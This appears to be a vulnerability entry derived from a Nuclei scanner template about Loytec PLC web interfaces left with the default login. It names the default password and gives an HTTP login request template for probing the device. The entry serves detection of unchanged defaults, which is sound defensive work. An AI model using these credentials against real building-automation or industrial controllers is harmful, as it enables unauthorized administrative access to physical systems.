# Vulnerability: Loytec PLC - Default Login
**Classification:** LOYTEC
**Source:** Nuclei Template (`loytec-default-password.yaml`)

## Description
Identified Loytec PLC web interfaces that were accessible using default credentials (admin:loytec4u). These devices were commonly deployed in building automation and industrial control environments. When left unchanged, default credentials could have allowed unauthorized users to gain administrative access to the system.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /webui/login HTTP/1.1
Host: {{Hostname}}
X-Create-Session: 1
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&login=Login
```

